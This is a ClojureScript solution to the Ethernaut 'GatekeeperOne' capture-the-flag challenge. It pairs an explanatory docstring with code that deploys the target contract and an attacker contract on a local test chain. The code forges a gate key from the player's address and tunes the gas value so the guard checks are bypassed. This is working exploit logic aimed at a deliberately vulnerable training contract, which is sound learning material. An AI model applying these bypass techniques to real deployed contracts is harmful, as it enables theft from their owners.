(ns main.ctf.ethernaut.gatekeeper-one
  "There are 3 modifiers on the `enter` function in
  the `GatekeeperOne` Contract. We look at these one by clone

  1. require(msg.sender != tx.origin)

  To make sure this holds true we need to call
  the enter function from another contract.
  It will ensure that tx.origin is our EOA addr and
  msg.sender is the proxy contract we are using.


  2. require(gasleft().mod(8191) == 0)

  By running contract locally, we can find out that
  it takes 254 gas until this line is executed in the EVM.
  8191 + 254 will not be enough gas for our whole execution.
  We could we (N*8192 + 254) to make the modulus return 0.

  3. require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))
     require(uint32(uint64(_gateKey)) != uint64(_gateKey))
     require(uint32(uint64(_gateKey)) == uint16(tx.origin))

  The last condition gives a hint that last 16 bits
  of the `_gateKey` should match our EOA address (tx.origin).

  Also last 16 bits should be equal to last
  32 bits (first condition) but the whole 64 bit
  `_gatekey` must NOT be equal to last 32 bits of the key.

  We could just take last 2 bytes of our addr.
  Pad the remaing 6 bytes with 0 and change one nibble
  in the first 8 bits."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-gatekeeper!
  "Deploys the GatekeeperOne contract using Owner's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :gatekeeperone
                  w/local-wallet)]
    (.deploy contract)))


;; todo: take & rest args and spread it in .deploy call
(defn deploy-attacker!
  "Deploys the attacker contract using players' wallet!
   Returns the `js/Promise`."
  [gatekeeper-addr key gas]
  (let [contract (u/contract
                  :gatekeeperone/attack
                  player)]
    (.deploy contract
             gatekeeper-addr
             key
             gas
             (js-obj "gasLimit" 20000000))))


(defn gatekeeper-attack
  []
  (try-async
   [gatekeeper (<p! (deploy-gatekeeper!))

    ;; take last 2 bytes of player's addr
    ;; see docsting above for the explaination
    last-2-bytes (.hexDataSlice
                  (.-utils u/ethers)
                  (.-address player)
                  18
                  20)
    gate-key (.replace (.hexZeroPad
                        (.-utils u/ethers)
                        last-2-bytes
                        8)
                       "00000000"
                       "00000001")

    ;; gas calculation (see docstring above)
    gas  (u/big-num (+ (* 8191 100)
                       248
                       6))]
   (<p! (deploy-attacker!
         (.-address gatekeeper)
         gate-key
         gas))))



(comment

  ;; Execute this code block to attack
  (a/take! (gatekeeper-attack)
           #(.log js/console %))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (def gatekeeper (atom ""))


  (- 2000000 1999752)

  (-> (deploy-gatekeeper!)
      (.then #(reset! gatekeeper %))
      (.catch #(.log js/console %)))


  (def attacker (atom ""))


  (+ 81910 254)


  (def last-2-bytes (.hexDataSlice (.-utils u/ethers) (.-address player) 18 20))

  (-> (deploy-attacker!
       (.-address @gatekeeper)
       (.replace (.hexZeroPad (.-utils u/ethers) last-2-bytes 8)
                 "00000000"
                 "00000001")
       (u/big-num (+ (* 8191 100) 248 6)))

      (.then #(reset! attacker %))
      (.catch #(.log js/console %)))


  )
